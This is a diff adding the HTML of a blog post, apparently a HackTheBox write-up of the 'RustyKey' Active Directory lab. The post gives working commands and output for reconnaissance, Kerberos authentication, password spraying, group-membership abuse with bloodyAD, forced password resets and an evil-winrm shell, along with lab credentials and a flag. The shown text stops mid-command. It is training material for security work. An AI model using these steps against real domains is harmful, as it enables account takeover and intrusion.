@@ -1,0 +1,2098 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>0xblivion.dev</title>
+<meta name="keywords" content="">
+<meta name="description" content="HackTheBox: RustyKey Writeup
+RustyKey is a Hard Windows box on HackTheBox. The path starts with a given set of user credentials. From there, we use BloodHound to map out an attack path, which leads to a Timeroasting attack. This attack gives us the NTLM hash for a machine account, which we can crack.
+With the cracked password for the IT-Computer3$ machine account, we have the ability to add ourselves to the HelpDesk group. This allows us to pivot and eventually perform a COM DLL hijacking attack to gain access as the user mm.turner. As this user, we can configure Resource-Based Constrained Delegation (RBCD) against the domain controller. This lets us impersonate a privileged user, dump all the domain hashes with secretsdump, and finally grab the root flag.">
+<meta name="author" content="0xblivion">
+<link rel="canonical" href="http://localhost:1313/posts/htb/windows/hard/hackthebox---rustykey-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/htb/windows/hard/hackthebox---rustykey-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/posts/htb/windows/hard/hackthebox---rustykey-writeup/">
+  <meta property="og:site_name" content="0xblivion.dev">
+  <meta property="og:title" content="0xblivion.dev">
+  <meta property="og:description" content="HackTheBox: RustyKey Writeup RustyKey is a Hard Windows box on HackTheBox. The path starts with a given set of user credentials. From there, we use BloodHound to map out an attack path, which leads to a Timeroasting attack. This attack gives us the NTLM hash for a machine account, which we can crack.
+With the cracked password for the IT-Computer3$ machine account, we have the ability to add ourselves to the HelpDesk group. This allows us to pivot and eventually perform a COM DLL hijacking attack to gain access as the user mm.turner. As this user, we can configure Resource-Based Constrained Delegation (RBCD) against the domain controller. This lets us impersonate a privileged user, dump all the domain hashes with secretsdump, and finally grab the root flag.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+      <meta property="og:image" content="https://0xblivion.dev/img/favicon.png">
+  
+  <meta name="author" content="0xblivion">
+  <meta property="article:author" content="0xblivion">
+  <meta property="og:article:author" content="0xblivion">
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "author": {
+        "@type": "Person",
+        "name": "0xblivion"
+      }
+    }
+  </script>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0xblivion.dev/img/favicon.png">
+<meta name="twitter:title" content="">
+<meta name="twitter:description" content="HackTheBox: RustyKey Writeup
+RustyKey is a Hard Windows box on HackTheBox. The path starts with a given set of user credentials. From there, we use BloodHound to map out an attack path, which leads to a Timeroasting attack. This attack gives us the NTLM hash for a machine account, which we can crack.
+With the cracked password for the IT-Computer3$ machine account, we have the ability to add ourselves to the HelpDesk group. This allows us to pivot and eventually perform a COM DLL hijacking attack to gain access as the user mm.turner. As this user, we can configure Resource-Based Constrained Delegation (RBCD) against the domain controller. This lets us impersonate a privileged user, dump all the domain hashes with secretsdump, and finally grab the root flag.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "",
+      "item": "http://localhost:1313/posts/htb/windows/hard/hackthebox---rustykey-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "name": "",
+  "description": "HackTheBox: RustyKey Writeup RustyKey is a Hard Windows box on HackTheBox. The path starts with a given set of user credentials. From there, we use BloodHound to map out an attack path, which leads to a Timeroasting attack. This attack gives us the NTLM hash for a machine account, which we can crack.\nWith the cracked password for the IT-Computer3$ machine account, we have the ability to add ourselves to the HelpDesk group. This allows us to pivot and eventually perform a COM DLL hijacking attack to gain access as the user mm.turner. As this user, we can configure Resource-Based Constrained Delegation (RBCD) against the domain controller. This lets us impersonate a privileged user, dump all the domain hashes with secretsdump, and finally grab the root flag.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "HackTheBox: RustyKey Writeup RustyKey is a Hard Windows box on HackTheBox. The path starts with a given set of user credentials. From there, we use BloodHound to map out an attack path, which leads to a Timeroasting attack. This attack gives us the NTLM hash for a machine account, which we can crack.\nWith the cracked password for the IT-Computer3$ machine account, we have the ability to add ourselves to the HelpDesk group. This allows us to pivot and eventually perform a COM DLL hijacking attack to gain access as the user mm.turner. As this user, we can configure Resource-Based Constrained Delegation (RBCD) against the domain controller. This lets us impersonate a privileged user, dump all the domain hashes with secretsdump, and finally grab the root flag.\nTarget IP 10.10.22.233 Initial Credentials rr.parker:8#t5HE8L!W3A + − ⌂ [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Timeroasting → Crack IT-Computer3$ [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray → Identify Valid IT-Computer3$ [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Add IT-Computer3$ to HELPDESK [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Reset bb.morgan Password → Evil-WinRM Access [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Download internal.pdf → Find COM Hijack Lead [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Reset ee.reed Password → Runas Reverse Shell [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Exploit 7-Zip COM Hijack → Meterpreter as mm.turner [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]RBCD → Impersonate backupadmin → Dump Hashes [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Use TGT (Pass-the-Ticket) → SYSTEM Initial Access (TA0001) Reconnaissance (TA0043) As always, I started with an nmap scan to see what services were running on the target.\n0xblivion@rustykey: ~ root@localhost:~# sudo nmap -sVC -oA nmap/rustykey 10.10.11.75 -vv # Nmap 7.95 scan initiated Sun Jun 29 08:19:57 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/rustykey -vv 10.10.11.75 Nmap scan report for dc (10.10.11.75) Host is up, received reset ttl 127 (0.056s latency). Scanned at 2025-06-29 08:19:57 EDT for 20s Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-29 12:20:04Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 51928/tcp): CLEAN (Couldn't connect) | Check 2 (port 27628/tcp): CLEAN (Couldn't connect) | Check 3 (port 63867/udp): CLEAN (Timeout) | Check 4 (port 46581/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-29T12:20:08 |_ start_date: N/A |_clock-skew: -1s Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 29 08:20:17 2025 -- 1 IP address (1 host up) scanned in 20.55 seconds copy The scan revealed multiple open ports, many of which are typical for an Active Directory Domain Controller.\nPorts 88, 389, 445, 3268/3269: Standard AD services (Kerberos, LDAP, SMB).\nPort 5985: WinRM is available.\nDomain: rustykey.htb\nThe next step is to add rustykey.htb to my /etc/hosts file.\n0xblivion@rustykey: ~ root@localhost:~# echo \"10.10.11.75 rustykey.htb\" | sudo tee -a /etc/hosts copy Time Synchronization for Kerberos Since we’re dealing with Active Directory, our system time needs to be synchronized with the domain controller to avoid Kerberos authentication issues. A time skew can cause Kerberos to reject our tickets.\n0xblivion@rustykey: ~ root@localhost:~# sudo systemctl stop systemd-timesyncd.service root@localhost:~# sudo ntpdate 10.10.11.75 copy Active Directory Discovery (TA0007) I started by checking if I could access any SMB shares with the provided credentials.\n0xblivion@rustykey: ~ root@localhost:~# nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' SMB 10.10.11.75 445 10.10.11.75 [*] x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.75 445 10.10.11.75 [-] 10.10.11.75\\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED copy The STATUS_NOT_SUPPORTED error suggests that NTLM authentication might be disabled. I switched to Kerberos authentication using the -k flag.\n0xblivion@rustykey: ~ root@localhost:~# nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k SMB 10.10.11.75 445 10.10.11.75 [*] x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.75 445 10.10.11.75 [-] 10.10.11.75\\rr.parker:8#t5HE8L!W3A KDC_ERR_WRONG_REALM root@localhost:~# nxc smb rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k SMB rustykey.htb 445 rustykey [*] x64 (name:rustykey) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False) SMB rustykey.htb 445 rustykey [-] htb\\rr.parker:8#t5HE8L!W3A [Errno Connection error (HTB:88)] [Errno -2] Name or service not known copy This time, I got a KDC_ERR_WRONG_REALM error. This usually happens when the client can’t find the correct Kerberos realm for the target. Using the hostname rustykey.htb might fix this, but it led to a different connection error. This suggests a DNS issue; the system doesn’t know the Fully Qualified Domain Name (FQDN) of the DC.\nI used nslookup to find the FQDN.\n0xblivion@rustykey: ~ root@localhost:~# nslookup \u003e server 10.10.11.75 Default server: 10.10.11.75 Address: 10.10.11.75#53 \u003e 127.0.0.1 1.0.0.127.in-addr.arpa name = localhost. \u003e 10.10.11.75 ;; communications error to 10.10.11.75#53: timed out dc;; communications error to 10.10.11.75#53: timed out ;; communications error to 10.10.11.75#53: timed out ;; no servers could be reached \u003e rustykey.htb Server: 10.10.11.75 Address: 10.10.11.75#53 Name: rustykey.htb Address: 10.10.11.75 dName: rustykey.htb Address: dead:beef::edd:dcc8:14fa:512c Name: rustykey.htb Address: dead:beef::1ab Name: rustykey.htb Address: dead:beef::74af:71cc:d5e3:9919 \u003e dc.rustykey.htb Server: 10.10.11.75 Address: 10.10.11.75#53 Name: dc.rustykey.htb Address: 10.10.11.75 Name: dc.rustykey.htb Address: dead:beef::edd:dcc8:14fa:512c \u003e dc01.rustykey.htb Server: 10.10.11.75 Address: 10.10.11.75#53 ** server can't find dc01.rustykey.htb: NXDOMAIN ... copy By trying common hostnames like dc, I confirmed that the FQDN is dc.rustykey.htb. I added this to my /etc/hosts file and ran netexec again.\n0xblivion@rustykey: ~ root@localhost:~# nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --shares SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.rustykey.htb 445 dc [+] rustykey.htb\\rr.parker:8#t5HE8L!W3A SMB dc.rustykey.htb 445 dc [*] Enumerated shares SMB dc.rustykey.htb 445 dc Share Permissions Remark SMB dc.rustykey.htb 445 dc ----- ----------- ------ SMB dc.rustykey.htb 445 dc ADMIN$ Remote Admin SMB dc.rustykey.htb 445 dc C$ Default share SMB dc.rustykey.htb 445 dc IPC$ READ Remote IPC SMB dc.rustykey.htb 445 dc NETLOGON READ Logon server share SMB dc.rustykey.htb 445 dc SYSVOL READ Logon server share copy Success! The shares are just the default ones, but we have confirmed our credentials and access. To make future Kerberos authentication smoother, I generated a krb5.conf file and moved it to /etc/:\n0xblivion@rustykey: ~ root@localhost:~# nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --generate-krb5-file rustykey.krb SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.rustykey.htb 445 dc [+] rustykey.htb\\rr.parker:8#t5HE8L!W3A root@localhost:~# cat rustykey.krb [libdefaults] dns_lookup_kdc = false dns_lookup_realm = false default_realm = RUSTYKEY.HTB [realms] RUSTYKEY.HTB = { kdc = dc.rustykey.htb admin_server = dc.rustykey.htb default_domain = rustykey.htb } [domain_realm] .rustykey.htb = RUSTYKEY.HTB rustykey.htb = RUSTYKEY.HTB root@localhost:~# sudo cp rustykey.krb /etc/krb5.conf copy Credential Access (TA0006) Timeroasting (T1558.004) I got stuck for a bit after running all the usual enumeration scripts without any hits. I decided to take a break, touch some grass, and do some research. I came across a cool article on Medium about a Timeroasting attack: Targeted TimeRoasting.\nThe TL;DR is that the NTP protocol can leak Net-NTLMv1 hashes from machine accounts. These hashes are notoriously weak and can often be cracked easily.\nI used ntproast to perform the attack and got a hash.\nThen, I cracked it with ntpcrack:\nPassword Spraying (T1110.003) The cracked password is Rusty88!. Now I needed to figure out which account this password belongs to. I decided to enumerate all domain users and computer accounts and then spray this password against the list.\nFirst, I got a Ticket Granting Ticket (TGT) for rr.parker to authenticate for further enumeration.\n0xblivion@rustykey: ~ root@localhost:~# getTGT.py rustykey.htb/rr.parker:'8#t5HE8L!W3A' Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in rr.parker.ccache copy Then I exported the ticket so my tools could use it.\n0xblivion@rustykey: ~ root@localhost:~# export KRB5CCNAME=$(pwd)/rr.parker.ccache copy Next, I used netexec with the --rid-brute flag to enumerate all objects in the domain, including users and computer accounts.\n0xblivion@rustykey: ~ root@localhost:~# nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --rid-brute SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.rustykey.htb 445 dc [+] rustykey.htb\\rr.parker:8#t5HE8L!W3A SMB dc.rustykey.htb 445 dc 498: RUSTYKEY\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB dc.rustykey.htb 445 dc 500: RUSTYKEY\\Administrator (SidTypeUser) SMB dc.rustykey.htb 445 dc 501: RUSTYKEY\\Guest (SidTypeUser) SMB dc.rustykey.htb 445 dc 502: RUSTYKEY\\krbtgt (SidTypeUser) SMB dc.rustykey.htb 445 dc 512: RUSTYKEY\\Domain Admins (SidTypeGroup) SMB dc.rustykey.htb 445 dc 513: RUSTYKEY\\Domain Users (SidTypeGroup) SMB dc.rustykey.htb 445 dc 514: RUSTYKEY\\Domain Guests (SidTypeGroup) SMB dc.rustykey.htb 445 dc 515: RUSTYKEY\\Domain Computers (SidTypeGroup) SMB dc.rustykey.htb 445 dc 516: RUSTYKEY\\Domain Controllers (SidTypeGroup) SMB dc.rustykey.htb 445 dc 517: RUSTYKEY\\Cert Publishers (SidTypeAlias) SMB dc.rustykey.htb 445 dc 518: RUSTYKEY\\Schema Admins (SidTypeGroup) SMB dc.rustykey.htb 445 dc 519: RUSTYKEY\\Enterprise Admins (SidTypeGroup) SMB dc.rustykey.htb 445 dc 520: RUSTYKEY\\Group Policy Creator Owners (SidTypeGroup) SMB dc.rustykey.htb 445 dc 521: RUSTYKEY\\Read-only Domain Controllers (SidTypeGroup) SMB dc.rustykey.htb 445 dc 522: RUSTYKEY\\Cloneable Domain Controllers (SidTypeGroup) SMB dc.rustykey.htb 445 dc 525: RUSTYKEY\\Protected Users (SidTypeGroup) SMB dc.rustykey.htb 445 dc 526: RUSTYKEY\\Key Admins (SidTypeGroup) SMB dc.rustykey.htb 445 dc 527: RUSTYKEY\\Enterprise Key Admins (SidTypeGroup) SMB dc.rustykey.htb 445 dc 553: RUSTYKEY\\RAS and IAS Servers (SidTypeAlias) SMB dc.rustykey.htb 445 dc 571: RUSTYKEY\\Allowed RODC Password Replication Group (SidTypeAlias) SMB dc.rustykey.htb 445 dc 572: RUSTYKEY\\Denied RODC Password Replication Group (SidTypeAlias) SMB dc.rustykey.htb 445 dc 1000: RUSTYKEY\\DC$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1101: RUSTYKEY\\DnsAdmins (SidTypeAlias) SMB dc.rustykey.htb 445 dc 1102: RUSTYKEY\\DnsUpdateProxy (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1103: RUSTYKEY\\Support-Computer1$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1104: RUSTYKEY\\Support-Computer2$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1105: RUSTYKEY\\Support-Computer3$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1106: RUSTYKEY\\Support-Computer4$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1107: RUSTYKEY\\Support-Computer5$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1118: RUSTYKEY\\Finance-Computer1$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1119: RUSTYKEY\\Finance-Computer2$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1120: RUSTYKEY\\Finance-Computer3$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1121: RUSTYKEY\\Finance-Computer4$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1122: RUSTYKEY\\Finance-Computer5$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1123: RUSTYKEY\\IT-Computer1$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1124: RUSTYKEY\\IT-Computer2$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1125: RUSTYKEY\\IT-Computer3$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1126: RUSTYKEY\\IT-Computer4$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1127: RUSTYKEY\\IT-Computer5$ (SidTypeUser) SMB dc.rustykey.htb 445 dc 1128: RUSTYKEY\\HelpDesk (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1130: RUSTYKEY\\Protected Objects (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1131: RUSTYKEY\\IT (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1132: RUSTYKEY\\Support (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1133: RUSTYKEY\\Finance (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1136: RUSTYKEY\\DelegationManager (SidTypeGroup) SMB dc.rustykey.htb 445 dc 1137: RUSTYKEY\\rr.parker (SidTypeUser) SMB dc.rustykey.htb 445 dc 1138: RUSTYKEY\\mm.turner (SidTypeUser) SMB dc.rustykey.htb 445 dc 1139: RUSTYKEY\\bb.morgan (SidTypeUser) SMB dc.rustykey.htb 445 dc 1140: RUSTYKEY\\gg.anderson (SidTypeUser) SMB dc.rustykey.htb 445 dc 1143: RUSTYKEY\\dd.ali (SidTypeUser) SMB dc.rustykey.htb 445 dc 1145: RUSTYKEY\\ee.reed (SidTypeUser) SMB dc.rustykey.htb 445 dc 1146: RUSTYKEY\\nn.marcos (SidTypeUser) SMB dc.rustykey.htb 445 dc 3601: RUSTYKEY\\backupadmin (SidTypeUser) copy After getting a full list, I used some awk and grep magic to clean it up, leaving me with a nice list of usernames and computer accounts in users.txt. Then, I launched the password spraying attack.\n0xblivion@rustykey: ~ root@localhost:~# nxc smb dc.rustykey.htb -u users.txt -p 'Rusty88!' -k --continue-on-success SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Administrator:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\backupadmin:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\bb.morgan:Rusty88! KDC_ERR_ETYPE_NOSUPP SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\DC$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\dd.ali:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\ee.reed:Rusty88! KDC_ERR_ETYPE_NOSUPP SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Finance-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Finance-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Finance-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Finance-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Finance-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\gg.anderson:Rusty88! KDC_ERR_CLIENT_REVOKED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Guest:Rusty88! KDC_ERR_CLIENT_REVOKED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\IT-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\IT-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [+] rustykey.htb\\IT-Computer3$:Rusty88! SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\IT-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\IT-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\krbtgt:Rusty88! KDC_ERR_CLIENT_REVOKED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\mm.turner:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\nn.marcos:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\rr.parker:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Support-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Support-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Support-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Support-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\Support-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED ... copy And we got a hit! The password Rusty88! belongs to the machine account IT-Computer3$.\nPrivilege Escalation \u0026 Lateral Movement (TA0004, TA0008) BloodHound Analysis (T1069) With new credentials for a machine account, it was time to fire up BloodHound to see what IT-Computer3$ could do. I ran the Python collector and imported the data.\nThe first thing I noticed was a direct path to add the machine account to the HELPDESK group.\nThe IT-Computer3$ account has AddSelf permissions on the HELPDESK group. Looking at the HELPDESK group’s outbound permissions, it has ForceChangePassword rights over several users.\nI checked the privileges for these users and found that bb.morgan, gg.anderson, and ee.reed were members of the IT group and could use WinRM because they are in the Remote Management Users group.\nHowever, there’s a catch: these users are part of a group that is a member of Protected Objects. This means we likely can’t change their passwords directly. The solution is to first remove their group (IT or Support) from the Protected Objects group, which HELPDESK has the rights to do.\nFinally, I ran a custom Cypher query to look for interesting users and found mm.turner:\nCYPHER MATCH (u:User) RETURN u This user is a member of the DelegationManager group, which has AddAllowedToAct permissions on the domain controller itself. This is a clear path to domain admin via Resource-Based Constrained Delegation (RBCD).\nWith this attack path visualized, it was time to execute.\nGaining User Access via Password Reset (T1098) First, I got a TGT for our machine account.\n0xblivion@rustykey: ~ root@localhost:~# getTGT.py rustykey.htb/IT-Computer3$:'Rusty88!' /opt/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in IT-Computer3$.ccache root@localhost:~# export KRB5CCNAME=$(pwd)/IT-Computer3\\$.ccache copy Next, I used bloodyAD to add IT-Computer3$ to the HELPDESK group.\n0xblivion@rustykey: ~ root@localhost:~# bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k add groupMember HELPDESK 'IT-COMPUTER3$' [+] IT-COMPUTER3$ added to HELPDESK copy Now as a member of HELPDESK, I removed the IT group from Protected Objects.\n0xblivion@rustykey: ~ root@localhost:~# bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT' [-] IT removed from Protected Objects copy With the protection removed, I could change bb.morgan’s password.\n0xblivion@rustykey: ~ root@localhost:~# bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -k -p 'Rusty88!' set password 'bb.morgan' '@Password123!' [+] Password changed successfully! copy Then, I got a TGT for bb.morgan and used evil-winrm to get a shell.\n0xblivion@rustykey: ~ root@localhost:~# getTGT.py rustykey.htb/bb.morgan:'@Password123!' Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in bb.morgan.ccache root@localhost:~# export KRB5CCNAME=bb.morgan.ccache copy 0xblivion@rustykey: ~ root@localhost:~# evil-winrm -i dc.rustykey.htb -r rustykey.htb Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS PS C:\\Users\\bb.morgan\\Documents\u003e cd .. *Evil-WinRM* PS PS C:\\Users\\bb.morgan\u003e tree /f Folder PATH listing Volume serial number is 00BA-0DBE C:. ÃÄÄÄDesktop ³ internal.pdf ³ user.txt ³ ÃÄÄÄDocuments ÃÄÄÄDownloads ÃÄÄÄFavorites ÃÄÄÄLinks ÃÄÄÄMusic ÃÄÄÄPictures ÃÄÄÄSaved Games ÀÄÄÄVideos *Evil-WinRM* PS PS C:\\Users\\bb.morgan\u003e cd Desktop *Evil-WinRM* PS PS C:\\Users\\bb.morgan\\Desktop\u003e type user.txt ef5edae78dbbff44a6e3972d29226adf *Evil-WinRM* PS PS C:\\Users\\bb.morgan\\Desktop\u003e download internal.pdf Info: Downloading C:\\Users\\bb.morgan\\Desktop\\internal.pdf to internal.pdf Info: Download successful! copy I grabbed the user flag and downloaded an interesting PDF from the desktop.\nUser flag: ef5edae78dbbff44a6e3972d29226adf COM Hijacking for Privilege Escalation (T1546.015) I opened the internal.pdf file I downloaded:\nIt’s a memo from bb.morgan to the support team about a new archiving utility. This immediately screams some kind of DLL or COM hijacking opportunity. The memo mentions the Support group, so I checked its members in BloodHound and found ee.reed. Since I’m effectively in the HELPDESK group, I can change ee.reed’s password too.\nFirst, I had to re-add my machine account to the HELPDESK group, as a cleanup script on the server seems to revert these changes periodically.\n0xblivion@rustykey: ~ root@localhost:~# bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k add groupMember HELPDESK 'IT-COMPUTER3$' [+] IT-COMPUTER3$ added to HELPDESK copy Then, I removed the SUPPORT group from Protected Objects.\n0xblivion@rustykey: ~ root@localhost:~# bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 